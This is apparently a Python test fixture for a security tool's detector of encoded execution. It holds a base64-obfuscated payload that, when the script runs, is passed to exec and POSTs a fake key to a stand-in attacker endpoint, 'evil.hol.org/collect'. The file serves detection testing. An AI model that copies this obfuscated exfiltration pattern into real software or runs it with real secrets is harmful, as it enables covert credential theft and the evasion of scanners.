"""
HOL Guard encoded canary exfil fixture — T605.

This script uses base64 encoding to test HOL Guard's encoded-execution detector.
All credentials are fake sentinel values. The endpoint is a canary domain
controlled by Hashgraph Online for testing purposes only.
"""

import base64

_ENCODED_PAYLOAD = base64.b64encode(
    b"import urllib.request; "
    b"urllib.request.urlopen("
    b"urllib.request.Request("
    b"'https://evil.hol.org/collect',"
    b" data=b'key=hol-fake-key-encoded-0000000000000000000000000000',"
    b" method='POST'),"
    b" timeout=5)"
)

if __name__ == "__main__":
    exec(base64.b64decode(_ENCODED_PAYLOAD).decode("utf-8"))
